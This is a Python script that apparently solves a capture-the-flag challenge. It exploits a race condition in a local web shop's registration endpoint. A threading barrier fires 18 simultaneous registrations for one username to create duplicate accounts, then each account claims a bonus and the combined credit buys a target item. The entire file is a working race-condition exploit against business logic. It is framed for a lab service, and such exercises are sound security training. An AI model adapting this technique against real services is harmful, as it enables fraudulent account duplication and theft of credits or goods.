#!/usr/bin/env python3
from __future__ import annotations

import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.cookiejar import CookieJar
from threading import Barrier
from urllib.error import HTTPError, URLError
from urllib.request import HTTPCookieProcessor, Request, build_opener

BASE_URL = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:9797"
ACCOUNT_COUNT = 18
MIN_ACCOUNTS_NEEDED = 5
TARGET_ITEM = "rainbow-road-golden-kart"


def decode_response(response) -> dict:
    body = response.read().decode()
    return json.loads(body) if body else {}


def request_json(opener, method: str, path: str, payload: dict | None = None) -> tuple[int, dict]:
    data = None
    headers = {"Accept": "application/json"}
    if payload is not None:
        data = json.dumps(payload).encode()
        headers["Content-Type"] = "application/json"

    request = Request(f"{BASE_URL}{path}", data=data, headers=headers, method=method)
    try:
        with opener.open(request, timeout=15) as response:
            return response.status, decode_response(response)
    except HTTPError as error:
        return error.code, decode_response(error)
    except URLError as error:
        raise SystemExit(f"request failed: {error}") from error


def register_account(barrier: Barrier, username: str, index: int):
    opener = build_opener(HTTPCookieProcessor(CookieJar()))
    password = f"pw-{index}-{time.time_ns()}"
    barrier.wait()
    status, data = request_json(
        opener,
        "POST",
        "/register",
        {"username": username, "password": password},
    )
    return opener, password, status, data


def main() -> None:
    username = f"race_{int(time.time())}"
    barrier = Barrier(ACCOUNT_COUNT)

    print(f"[*] racing {ACCOUNT_COUNT} registrations for username {username!r}")
    accounts = []
    with ThreadPoolExecutor(max_workers=ACCOUNT_COUNT) as pool:
        futures = [pool.submit(register_account, barrier, username, i) for i in range(ACCOUNT_COUNT)]
        for future in as_completed(futures):
            opener, password, status, data = future.result()
            if status == 201 and data.get("ok"):
                accounts.append(opener)
            else:
                print(f"[-] register failed: HTTP {status} {data}")

    print(f"[*] created {len(accounts)} duplicate accounts")
    if len(accounts) < MIN_ACCOUNTS_NEEDED:
        raise SystemExit("not enough accounts won the race; run the solver again")

    for index, opener in enumerate(accounts, 1):
        status, data = request_json(opener, "POST", "/claim", {})
        print(f"[*] claim {index:02d}: HTTP {status} {data}")

    status, data = request_json(accounts[0], "POST", "/purchase", {"item": TARGET_ITEM})
    print(f"[*] purchase response: HTTP {status} {data}")


if __name__ == "__main__":
    main()
